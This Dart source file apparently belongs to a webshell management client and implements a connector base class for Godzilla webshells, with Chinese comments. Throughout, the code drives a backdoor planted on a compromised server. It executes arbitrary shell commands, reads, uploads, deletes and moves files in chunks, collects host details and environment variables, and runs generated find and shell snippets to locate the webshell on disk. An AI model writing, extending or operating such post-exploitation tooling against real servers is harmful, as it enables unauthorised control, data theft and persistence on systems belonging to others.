import 'dart:convert';
import 'dart:typed_data';

import '../../models/file_entry.dart';
import '../../utils/encoding_utils.dart';
import '../shell_connector.dart';
import '../shell_script_dir_probe.dart';
import 'godzilla_payload_assets.dart';
import 'godzilla_transport.dart';
import 'godzilla_variant.dart';

/// Godzilla 标准马连接器基类。
///
/// 子类只需要实现“语言差异”的几个 primitive（参数名/返回格式），
/// 其余 Matrix `ShellConnector` 契约由这里统一实现。
abstract class GodzillaConnectorBase extends ShellConnector {
  GodzillaConnectorBase(super.webshell, this.variant);

  final GodzillaVariant variant;

  late final GodzillaTransport _transport = GodzillaTransport(
    url: webshell.url,
    password: webshell.password ?? '',
    secretKey: webshell.secretKey,
    variant: variant,
    engineLoader: () => GodzillaPayloadAssets.load(variant.engineAsset),
  );

  String? _lastPingDiagnostic;
  String? _lastShellScriptDirDiagnostic;
  bool? _windows;
  Future<Map<String, String>>? _basicsFuture;

  String get key16 => _transport.key16;

  @override
  Set<ConnectorCapability> get capabilities => const {
    ConnectorCapability.codeExec,
    ConnectorCapability.shellExec,
    ConnectorCapability.fileRead,
    ConnectorCapability.fileWrite,
  };

  @override
  String? get lastPingDiagnostic => _lastPingDiagnostic;

  @override
  String? get lastShellScriptDirDiagnostic => _lastShellScriptDirDiagnostic;

  // ── 语言差异点 ──────────────────────────────────────────────────────────

  /// 执行命令的 methodName（四种语言都叫 execCommand）。
  String get execMethod => 'execCommand';

  /// 把一条完整 shell 命令翻译成目标引擎的参数。
  Map<String, List<int>> execParams(String command, {required bool windows});

  // ── 协议调用 ────────────────────────────────────────────────────────────

  Future<Uint8List> callBytes(
    String method, [
    Map<String, List<int>> params = const {},
  ]) {
    return _transport.call({'methodName': utf8.encode(method), ...params});
  }

  Future<String> callText(
    String method, [
    Map<String, List<int>> params = const {},
  ]) async {
    return decodeWithFallback(await callBytes(method, params));
  }

  Future<Map<String, String>> _loadBasics() {
    return _basicsFuture ??= callText('getBasicsInfo').then(_parseBasics);
  }

  Map<String, String> _parseBasics(String text) {
    final map = <String, String>{};
    for (final line in text.split('\n')) {
      final idx = line.indexOf(' : ');
      if (idx <= 0) continue;
      final key = line.substring(0, idx).trim();
      final value = line.substring(idx + 3).trim();
      if (key.isNotEmpty) map[key] = value;
    }
    return map;
  }

  // ── ShellConnector 契约 ─────────────────────────────────────────────────

  @override
  Future<bool> ping() async {
    try {
      final info = await callText('getBasicsInfo');
      if (info.contains('FileRoot') ||
          info.contains('CurrentDir') ||
          info.contains('OsInfo') ||
          info.contains('CurrentUser')) {
        _lastPingDiagnostic = null;
        return true;
      }
      _lastPingDiagnostic = info.isEmpty
          ? (_transport.lastError ?? 'empty response')
          : info;
      return false;
    } catch (e) {
      _lastPingDiagnostic = e.toString();
      return false;
    }
  }

  Future<bool> _isWindowsTarget() async {
    if (_windows != null) return _windows!;
    if (webshell.connectorType.startsWith('asp')) {
      _windows = true;
      return true;
    }
    try {
      final basics = await _loadBasics();
      final os = basics['OsInfo'] ?? basics['OSVersion'] ?? '';
      _windows = os.toLowerCase().contains('windows');
    } catch (_) {
      _windows = false;
    }
    return _windows!;
  }

  /// 规范化引擎返回的目录：统一分隔符、去掉结尾的 `/.`。
  static String _normalizeDir(String raw) {
    var value = raw.trim().replaceAll('\\', '/');
    while (value.endsWith('/.')) {
      value = value.substring(0, value.length - 2);
    }
    if (value.length > 1 && value.endsWith('/')) {
      value = value.substring(0, value.length - 1);
    }
    return value;
  }

  static String _quote(String value) => "'${value.replaceAll("'", "'\\''")}'";

  static String _withWorkingDir(
    String command,
    String workingDir, {
    required bool windows,
  }) {
    if (workingDir.isEmpty) return command;
    if (windows) {
      return 'cd /d "$workingDir" && $command';
    }
    return 'cd ${_quote(workingDir)} && $command';
  }

  @override
  Future<String> executeCommand(String cmd, {String workingDir = ''}) async {
    try {
      final windows = await _isWindowsTarget();
      final full = _withWorkingDir(cmd, workingDir, windows: windows);
      final bytes = await callBytes(
        execMethod,
        execParams(full, windows: windows),
      );
      return decodeWithFallback(bytes).trim();
    } catch (e) {
      return '[Error] $e';
    }
  }

  @override
  Future<String> getCurrentDir() async {
    try {
      final basics = await _loadBasics();
      final dir = basics['CurrentDir'];
      if (dir != null && dir.trim().isNotEmpty) {
        final normalized = _normalizeDir(dir);
        currentDir = normalized;
        return normalized;
      }
    } catch (_) {}
    final pwd = await executeCommand(await _isWindowsTarget() ? 'cd' : 'pwd');
    final value = pwd.trim();
    if (value.isNotEmpty && !value.startsWith('[')) {
      currentDir = value;
    }
    return currentDir;
  }

  /// 定位「WebShell 脚本所在目录」。
  ///
  /// 优先级与 `jsp_behinder` / `jsp_classloader` 一致：先用 URL 里的文件名
  /// 在候选目录里找真实文件，找到就用它的父目录；找不到再退回
  /// `RealFile` / `DocBase` / 进程 cwd。
  ///
  /// Godzilla 引擎里 JSP/ASPX 的 `CurrentDir` 是 JVM/进程 cwd（例如
  /// `/usr/local/tomcat`），并不是 webapp 目录，所以不能直接用。
  @override
  Future<String?> getShellScriptDir() async {
    try {
      final basics = await _loadBasics();
      final windows = await _isWindowsTarget();
      final currentDirRaw = basics['CurrentDir'];
      final realFile = basics['RealFile'];
      final docBase = basics['DocBase'];
      final docRoot = basics['DOCUMENT_ROOT'] ?? basics['FileRoot'];

      final candidates = <String>[?currentDirRaw, ?realFile, ?docBase, ?docRoot]
          .map(_normalizeDir)
          .where((d) => d.isNotEmpty && d != '/' && d != '.' && d != r'\')
          .toSet()
          .toList();

      if (candidates.isEmpty) {
        _lastShellScriptDirDiagnostic = 'basics: no usable dir';
        return null;
      }

      final basename = ShellScriptDirProbe.safeBasenameFromUrl(webshell.url);
      if (basename == null || basename.isEmpty) {
        final fallback = candidates.first;
        _lastShellScriptDirDiagnostic = 'no basename; using $fallback';
        return fallback;
      }

      if (!windows) {
        final resolved = await _resolveUnixScriptDir(candidates, basename);
        if (resolved != null) {
          _lastShellScriptDirDiagnostic = 'found $resolved/$basename';
          return resolved;
        }
      } else {
        final resolved = await _resolveWindowsScriptDir(candidates, basename);
        if (resolved != null) {
          _lastShellScriptDirDiagnostic = 'found $resolved\\$basename';
          return resolved;
        }
      }

      // 没找到文件本身：退到最像 Web 根目录的候选。
      final fallback = _normalizeDir(realFile ?? docBase ?? candidates.first);
      _lastShellScriptDirDiagnostic =
          'not found; fallback=$fallback candidates=${candidates.join(",")}';
      return fallback;
    } catch (e) {
      _lastShellScriptDirDiagnostic = e.toString();
    }
    return null;
  }

  static String _shQuote(String value) => "'${value.replaceAll("'", "'\\''")}'";

  /// 在候选目录里找脚本文件，返回其父目录。
  Future<String?> _resolveUnixScriptDir(
    List<String> candidates,
    String basename,
  ) async {
    final buf = StringBuffer();
    for (final dir in candidates) {
      buf.writeln(
        'if [ -f ${_shQuote("$dir/$basename")} ]; '
        'then printf %s ${_shQuote(dir)}; exit 0; fi',
      );
    }
    for (final dir in candidates) {
      if (dir == '/') continue;
      buf.writeln(
        "_mx_hit=\$(find ${_shQuote(dir)} -maxdepth 8 -name "
        '${_shQuote(basename)} -type f 2>/dev/null | head -n 1)',
      );
      buf.writeln(r'[ -n "$_mx_hit" ] && { dirname "$_mx_hit"; exit 0; }');
    }
    final out = await executeCommand(buf.toString());
    final path = _firstPathLine(out);
    return path == null ? null : _normalizeDir(path);
  }

  Future<String?> _resolveWindowsScriptDir(
    List<String> candidates,
    String basename,
  ) async {
    final buf = StringBuffer();
    for (final dir in candidates) {
      final full = '${dir.replaceAll('/', r'\')}\\$basename';
      buf.writeln('if exist "$full" ( echo $dir & exit /b 0 )');
    }
    final out = await executeCommand(buf.toString());
    final path = _firstPathLine(out);
    return path == null ? null : _normalizeDir(path);
  }

  static String? _firstPathLine(String out) {
    for (final line in out.split('\n')) {
      final t = line.trim();
      if (t.isEmpty || t.startsWith('[')) continue;
      if (t.startsWith('/') || RegExp(r'^[A-Za-z]:\\').hasMatch(t)) return t;
    }
    return null;
  }

  @override
  Future<List<FileEntry>> listDirectory(String path) async {
    try {
      final text = await callText('getFile', {'dirName': utf8.encode(path)});
      return _parseFileList(text);
    } catch (_) {
      return [];
    }
  }

  List<FileEntry> _parseFileList(String text) {
    final lines = text.split('\n');
    if (lines.isEmpty || lines.first.trim() != 'ok') return [];
    final entries = <FileEntry>[];
    for (final line in lines.skip(2)) {
      if (line.trim().isEmpty) continue;
      final parts = line.split('\t');
      if (parts.length < 5) continue;
      final name = parts[0];
      if (name.isEmpty || name == '.' || name == '..') continue;
      final flag = parts[1].trim().toLowerCase();
      final isFile = flag == '1' || flag == 'true';
      entries.add(
        FileEntry(
          name: name,
          isDirectory: !isFile,
          size: int.tryParse(parts[3].trim()) ?? 0,
          permissions: parts[4].trim(),
          modified: parts[2].trim(),
        ),
      );
    }
    entries.sort((a, b) {
      if (a.name == '..') return -1;
      if (b.name == '..') return 1;
      if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
      return a.name.toLowerCase().compareTo(b.name.toLowerCase());
    });
    return entries;
  }

  @override
  Future<String> readFile(String path) async {
    final bytes = await callBytes(variant.readFileMethod, {
      'fileName': utf8.encode(path),
    });
    return decodeWithFallback(bytes);
  }

  @override
  Future<Uint8List> readFileBinary(String path) {
    return callBytes(variant.readFileMethod, {'fileName': utf8.encode(path)});
  }

  @override
  Future<bool> writeFile(String path, String content) {
    return writeFileBinary(path, Uint8List.fromList(utf8.encode(content)));
  }

  @override
  Future<bool> writeFileBinary(String path, Uint8List bytes) {
    return writeFileBinaryWithProgress(path, bytes, (_, _) {});
  }

  static const int _kMaxSingleWrite = 2 * 1024 * 1024;
  static const int _kChunkSize = 1024 * 1024;

  @override
  Future<bool> writeFileBinaryWithProgress(
    String path,
    Uint8List bytes,
    void Function(int sent, int total) onProgress,
  ) async {
    final total = bytes.length;
    onProgress(0, total);
    if (total <= _kMaxSingleWrite) {
      final result = await callText('uploadFile', {
        'fileName': utf8.encode(path),
        'fileValue': bytes,
      });
      if (result.trim() == 'ok') {
        onProgress(total, total);
        return true;
      }
      return false;
    }

    var offset = 0;
    while (offset < total) {
      final end = (offset + _kChunkSize).clamp(0, total);
      final chunk = bytes.sublist(offset, end);
      final params = <String, List<int>>{
        'fileName': utf8.encode(path),
        'fileContents': chunk,
      };
      if (offset > 0) {
        params['position'] = utf8.encode('$offset');
      }
      final result = await callText('bigFileUpload', params);
      if (result.trim() != 'ok') return false;
      offset = end;
      onProgress(offset, total);
    }
    return true;
  }

  @override
  Future<bool> deleteFile(String path) async {
    try {
      final result = await callText('deleteFile', {
        'fileName': utf8.encode(path),
      });
      return result.trim() == 'ok';
    } catch (_) {
      return false;
    }
  }

  @override
  Future<bool> createDirectory(String path) async {
    try {
      final result = await callText('newDir', {'dirName': utf8.encode(path)});
      return result.trim() == 'ok';
    } catch (_) {
      return false;
    }
  }

  @override
  Future<bool> createFile(String path) async {
    try {
      final result = await callText('newFile', {'fileName': utf8.encode(path)});
      return result.trim() == 'ok';
    } catch (_) {
      return false;
    }
  }

  @override
  Future<bool> copyFile(String from, String to) async {
    try {
      final result = await callText('copyFile', {
        'srcFileName': utf8.encode(from),
        'destFileName': utf8.encode(to),
      });
      return result.trim() == 'ok';
    } catch (_) {
      return false;
    }
  }

  @override
  Future<bool> moveFile(String from, String to) async {
    try {
      final result = await callText('moveFile', {
        'srcFileName': utf8.encode(from),
        'destFileName': utf8.encode(to),
      });
      return result.trim() == 'ok';
    } catch (_) {
      return false;
    }
  }

  @override
  Future<bool> setFileAttributes({
    required String type,
    required String path,
    required String attr,
  }) async {
    try {
      final result = await callText('setFileAttr', {
        'type': utf8.encode(type),
        'fileName': utf8.encode(path),
        'attr': utf8.encode(attr),
      });
      return result.trim() == 'ok';
    } catch (_) {
      return false;
    }
  }

  @override
  Future<int?> fileSize(String path) async {
    try {
      final text = await callText('bigFileDownload', {
        'fileName': utf8.encode(path),
        'mode': utf8.encode('fileSize'),
      });
      final value = int.tryParse(text.trim());
      if (value == null) return null;
      return value;
    } catch (_) {
      return null;
    }
  }

  @override
  Future<Uint8List> readFileRange(
    String path, {
    int position = 0,
    int length = 1024 * 1024,
  }) {
    return callBytes('bigFileDownload', {
      'fileName': utf8.encode(path),
      'mode': utf8.encode('read'),
      'position': utf8.encode('$position'),
      'readByteNum': utf8.encode('$length'),
    });
  }

  @override
  Future<Map<String, String>> getSystemInfo() async {
    final basics = await _loadBasics();
    final info = <String, String>{};

    void put(String key, String? value) {
      if (value != null && value.trim().isNotEmpty) {
        info[key] = value.trim();
      }
    }

    put('OS', basics['OsInfo'] ?? basics['OSVersion'] ?? basics['OS']);
    put('运行用户', basics['CurrentUser'] ?? basics['USER']);
    put('当前目录', basics['CurrentDir']);
    put('文档根目录', basics['DocBase'] ?? basics['RealFile'] ?? basics['FileRoot']);
    put(
      '服务器IP',
      basics['IPList'] ?? basics['SERVER_ADDR'] ?? basics['LOCAL_ADDR'],
    );
    put('服务器软件', basics['SERVER_SOFTWARE'] ?? basics['server.info']);
    put('内存限制', basics['memory_limit']);
    put('最大执行时间', basics['max_execution_time']);
    put('Safe Mode', basics['safe_mode']);
    put('主机名', basics['SERVER_NAME']);
    put('内核版本', basics['os.version']);
    put('.NET CLR 版本', basics['Version']);
    put('禁用函数', basics['disable_functions']);
    put('已加载扩展', basics['loaded_extensions']);

    final windows = await _isWindowsTarget();
    if (info['主机名'] == null) {
      final host = (await executeCommand('hostname')).trim();
      put('主机名', host);
    }
    if (info['用户ID'] == null) {
      final uid = (await executeCommand(windows ? 'whoami' : 'id -u')).trim();
      put('用户ID', uid);
    }
    if (info['内核版本'] == null && !windows) {
      final kernel = (await executeCommand('uname -r')).trim();
      put('内核版本', kernel);
    }

    // 保留原始字段，UI 会忽略未知 key，但便于调试/复制。
    for (final entry in basics.entries) {
      info.putIfAbsent(entry.key, () => entry.value);
    }
    return info;
  }

  @override
  Future<List<({String name, bool isDir})>> listNamesForCompletion(
    String path,
  ) async {
    final entries = await listDirectory(path);
    return [
      for (final entry in entries) (name: entry.name, isDir: entry.isDirectory),
    ];
  }

  @override
  Future<String> getHomeDir() async {
    final windows = await _isWindowsTarget();
    final result = await executeCommand(
      windows ? 'echo %USERPROFILE%' : 'echo \$HOME',
    );
    return result.trim();
  }

  @override
  Future<List<String>> listEnvVarNames() async {
    final windows = await _isWindowsTarget();
    final result = await executeCommand(windows ? 'set' : 'env');
    final names = <String>[];
    for (final line in result.split('\n')) {
      final idx = line.indexOf('=');
      if (idx > 0) {
        final name = line.substring(0, idx).trim();
        if (name.isNotEmpty) names.add(name);
      }
    }
    names.sort();
    return names;
  }
}
